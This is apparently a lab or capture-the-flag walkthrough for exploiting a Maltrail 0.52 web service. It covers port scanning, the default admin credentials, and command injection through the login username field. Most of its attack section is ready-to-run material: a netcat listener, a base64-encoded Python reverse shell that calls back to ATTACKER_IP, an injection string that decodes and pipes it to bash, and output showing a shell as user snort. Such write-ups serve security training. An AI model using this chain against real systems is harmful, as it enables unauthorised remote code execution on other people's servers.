# Maltrail

Maltrail exposes a Python HTTP service with a web login. The observed service identified itself as Maltrail `0.52` in the page footer and was vulnerable to command injection through the login username field.

## Discovery

Enumerate all TCP ports because Maltrail may listen on a high port:

```bash
nmap -sC -sV -p- TARGET -oA nmap/nmap.full
```

Observed indicators:

```text
8338/tcp open  http  Python http.server 3.5 - 3.10
|_http-title: Maltrail
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Maltrail/0.52
```

Confirm the application and version in the browser or with web fingerprinting:

```bash
whatweb http://TARGET:8338
```

The version is displayed at the bottom of the Maltrail page.

## Default Credentials

The documented default credentials successfully authenticated to the web interface:

```text
admin:changeme!
```

## Username Command Injection

The login username is passed into a shell command used to log failed authentication attempts. Command substitution in the username field can therefore execute a command even when a random password is supplied.

Start a listener:

```bash
nc -nlvp PORT
```

Create a Base64-encoded Python reverse shell payload:

```bash
echo -n 'python3 -c '\''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'\''' | base64 -w0
```

Enter the resulting value in the username field using this form and submit any password:

```bash
;`echo 'BASE64_PAYLOAD' | base64 -d | bash`
```

Successful execution returned a shell as `snort`:

```text
uid=1001(snort) gid=1001(snort) groups=1001(snort)
PWD=/opt/maltrail-0.53
```

## References

- https://github.com/stamparm/maltrail
- https://github.com/advisories/GHSA-6655-8f3g-xp52
- https://github.com/rvzsec/maltrail-rce
